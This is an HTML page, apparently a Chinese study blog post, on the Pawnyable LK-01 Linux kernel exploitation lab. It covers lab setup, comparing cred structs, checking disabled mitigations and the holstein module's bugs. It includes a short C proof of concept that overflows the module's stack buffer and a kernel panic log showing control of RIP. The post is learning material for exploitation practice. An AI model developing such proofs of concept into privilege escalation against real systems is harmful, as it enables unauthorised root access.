@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Static">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/01/23/pawnyable(1) - kernel rop/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="🐾What’s Pawnyable?🐾Pawnyableは、中〜上級者がpwn(Binary Exploitation)を勉強するための資料です。 站点地址：Linux Kernel Exploitation | PAWNYABLE!  前言本系列文章记录笔者在跟随Pawnable学习Kernel Pwn过程中的一些问题与学到的东西。本文是该系列的第一篇文章。 确保文件系统正常启动下载LK-0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pawnable笔记（一）之 Kernel ROP">
+<meta property="og:url" content="http://example.com/2024/01/23/Pawnyable(1)%20-%20Kernel%20ROP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="🐾What’s Pawnyable?🐾Pawnyableは、中〜上級者がpwn(Binary Exploitation)を勉強するための資料です。 站点地址：Linux Kernel Exploitation | PAWNYABLE!  前言本系列文章记录笔者在跟随Pawnable学习Kernel Pwn过程中的一些问题与学到的东西。本文是该系列的第一篇文章。 确保文件系统正常启动下载LK-0">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/09/07/sYFKuZiUVNIclBp.png">
+<meta property="article:published_time" content="2024-01-23T07:51:53.742Z">
+<meta property="article:modified_time" content="2023-11-20T14:54:24.524Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/09/07/sYFKuZiUVNIclBp.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/cat-96.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/cat-96.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/cat-96.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Pawnable笔记（一）之 Kernel ROP -
+        
+        Static&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Static&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/chuyin1.jpg","dark":"/images/JIJIAN.jpg"},"title":"Welcome here!","subtitle":{"text":["光阴有限同归老，风月无涯可慰颜。"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/cat-96.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Static&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Pawnable笔记（一）之 Kernel ROP</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/OIP-C.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Static</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-01-23 15:51:53</span>
+        <span class="mobile">2024-01-23 15:51:53</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-11-20 22:54:24</span>
+            <span class="mobile">2023-11-20 22:54:24</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="🐾What’s-Pawnyable-🐾"><a href="#🐾What’s-Pawnyable-🐾" class="headerlink" title="🐾What’s Pawnyable?🐾"></a><strong>🐾What’s Pawnyable?🐾</strong></h2><p>Pawnyableは、中〜上級者がpwn(Binary Exploitation)を勉強するための資料です。</p>
+<p>站点地址：<a class="link"   target="_blank" rel="noopener" href="https://pawnyable.cafe/linux-kernel/" >Linux Kernel Exploitation | PAWNYABLE! <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本系列文章记录笔者在跟随Pawnable学习Kernel Pwn过程中的一些问题与学到的东西。本文是该系列的第一篇文章。</p>
+<h2 id="确保文件系统正常启动"><a href="#确保文件系统正常启动" class="headerlink" title="确保文件系统正常启动"></a>确保文件系统正常启动</h2><p>下载LK-01，若重打包后出现报错，使用sudo打包运行即可。</p>
+<h2 id="使具有-root-权限"><a href="#使具有-root-权限" class="headerlink" title="使具有 root 权限"></a>使具有 root 权限</h2><p>在<code>init</code>脚本中加入<code>exec setsid /bin/cttyhack setuidgid 0 /bin/sh</code>(需要在最后一行启动shell之前写入，这种方法似乎不会执行<code>/etc/init.d/rcS</code>脚本，建议采取下一种方法)</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">devtmpfs does not get automounted <span class="keyword">for</span> initramfs</span></span><br><span class="line">/bin/mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">use the /dev/console device node from devtmpfs <span class="keyword">if</span> possible to not</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">confuse glibc<span class="string">&#x27;s ttyname_r().</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">This may fail (E.G. booted with console=), and errors from exec will</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">terminate the shell, so use a subshell for the test</span></span></span><br><span class="line">if (exec 0&lt;/dev/console) 2&gt;/dev/null; then</span><br><span class="line">    exec 0&lt;/dev/console</span><br><span class="line">    exec 1&gt;/dev/console</span><br><span class="line">    exec 2&gt;/dev/console</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exec setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">exec /sbin/init &quot;$@&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>也可以修改<code>/etc/init.d/S99pawnyable</code>，该脚本由<code>/etc/init.d/rcS</code>调用，而<code>/etc/init.d/rcS</code>在系统启动时由<code>/sbin/init</code>程序启动</p>
+<p>修改<code>/etc/init.d/S99pawnyable</code>中<code>setsid cttyhack setuidgid 1337 sh</code>的1337改为0即可</p>
+<h2 id="比较commit-creds函数的rdi"><a href="#比较commit-creds函数的rdi" class="headerlink" title="比较commit_creds函数的rdi"></a>比较commit_creds函数的rdi</h2><ul>
+<li><h3 id="root用户"><a href="#root用户" class="headerlink" title="root用户"></a>root用户</h3></li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0xffff88800328e500</span><br><span class="line">0xffff88800328e500:	0x0000000000000001	0x0000000000000000</span><br><span class="line">0xffff88800328e510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88800328e520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88800328e530:	0x000001ffffffffff	0x000001ffffffffff</span><br><span class="line">0xffff88800328e540:	0x000001ffffffffff	0x0000000000000000</span><br><span class="line">0xffff88800328e550:	0xffffffff81e32b00	0xffffffff81e32b80</span><br><span class="line">0xffff88800328e560:	0xffff888002d20510	0x0000000000000000</span><br><span class="line">0xffff88800328e570:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><h3 id="普通用户（uid-1337"><a href="#普通用户（uid-1337" class="headerlink" title="普通用户（uid&#x3D;1337"></a>普通用户（uid&#x3D;1337</h3></li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0xffff888003175b80</span><br><span class="line">0xffff888003175b80:	0x0000053900000001	0x0000000000000539</span><br><span class="line">0xffff888003175b90:	0x0000000000000539	0x0000000000000539</span><br><span class="line">0xffff888003175ba0:	0x0000000000000539	0x0000000000000000</span><br><span class="line">0xffff888003175bb0:	0x000001ffffffffff	0x000001ffffffffff</span><br><span class="line">0xffff888003175bc0:	0x000001ffffffffff	0x0000000000000000</span><br><span class="line">0xffff888003175bd0:	0xffff888003175500	0xffffffff81e32b80</span><br><span class="line">0xffff888003175be0:	0xffff888002d20510	0x0000000000000000</span><br><span class="line">0xffff888003175bf0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></div>
+
+<p>rdi为传入给<code>commit_creds</code>函数的cred结构体地址，cred结构体如下（kernel version: v5.11）</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	...</span><br><span class="line">        </span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
+
+<p>结构体中不同的部分实际上就是用户的id不同</p>
+<h2 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h2><ul>
+<li>查看<code>run.sh</code></li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr&quot; \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -cpu qemu64 \</span><br><span class="line">    -smp 1 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd rootfs_updated.cpio \</span><br><span class="line">    -net nic,model=virtio \</span><br><span class="line">    -net user</span><br></pre></td></tr></table></figure></div>
+
+<p>​    未开启kpti，且nokaslr，smap和smep也未开启</p>
+<ul>
+<li><p>修改<code>run.sh</code>中的<code>-cpu qemu64</code>为<code>-cpu qemu,+smep,+smap</code>即可开启</p>
+</li>
+<li><p>执行<code>head /proc/kallsyms</code>，得到如下地址，则基地址为<code>ffffffff81000000</code>(此时KADR未开启)</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ # head /proc/kallsyms </span><br><span class="line">ffffffff81000000 T startup_64</span><br><span class="line">ffffffff81000000 T _stext</span><br><span class="line">ffffffff81000000 T _text</span><br><span class="line">ffffffff81000040 T secondary_startup_64</span><br><span class="line">ffffffff81000045 T secondary_startup_64_no_verify</span><br><span class="line">ffffffff81000110 t verify_cpu</span><br><span class="line">ffffffff81000210 T sev_verify_cbit</span><br><span class="line">ffffffff81000220 T start_cpu0</span><br><span class="line">ffffffff81000230 T __startup_64</span><br><span class="line">ffffffff810005e0 T startup_64_setup_env</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h2 id="模块漏洞与触发"><a href="#模块漏洞与触发" class="headerlink" title="模块漏洞与触发"></a>模块漏洞与触发</h2><ul>
+<li><code>module_read</code>中存在越界读取</li>
+<li><code>module_write</code>中存在越界写入，栈溢出</li>
+<li><code>module_close</code>中存在UAF</li>
+</ul>
+<h3 id="栈溢出漏洞的简单触发POC"><a href="#栈溢出漏洞的简单触发POC" class="headerlink" title="栈溢出漏洞的简单触发POC"></a><strong>栈溢出漏洞的简单触发POC</strong></h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;模块打开失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x500</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[i] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	write(fd, buf, <span class="number">0x500</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行后产生<code>kernel panic</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">RIP: 0010:0x4141414141414141</span><br><span class="line">Code: Unable to access opcode bytes at RIP 0x4141414141414117.</span><br><span class="line">RSP: 0018:ffffc9000046beb8 EFLAGS: 00000202</span><br><span class="line">RAX: 0000000000000500 RBX: ffff888003169100 RCX: 0000000000000000</span><br><span class="line">RDX: 000000000000007f RSI: ffffc9000046bea8 RDI: ffff888003299400</span><br><span class="line">RBP: 4141414141414141 R08: 4141414141414141 R09: 4141414141414141</span><br><span class="line">R10: 4141414141414141 R11: 4141414141414141 R12: 0000000000000500</span><br><span class="line">R13: 0000000000000000 R14: 00007ffca658d210 R15: ffffc9000046bef8</span><br><span class="line">FS:  0000000000405678(0000) GS:ffff888003800000(0000) knlGS:0000000000000000</span><br><span class="line">CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">CR2: 0000000000403000 CR3: 000000000327e000 CR4: 00000000000006f0</span><br><span class="line">Kernel panic - not syncing: Fatal exception</span><br><span class="line">Kernel Offset: disabled</span><br></pre></td></tr></table></figure></div>
+
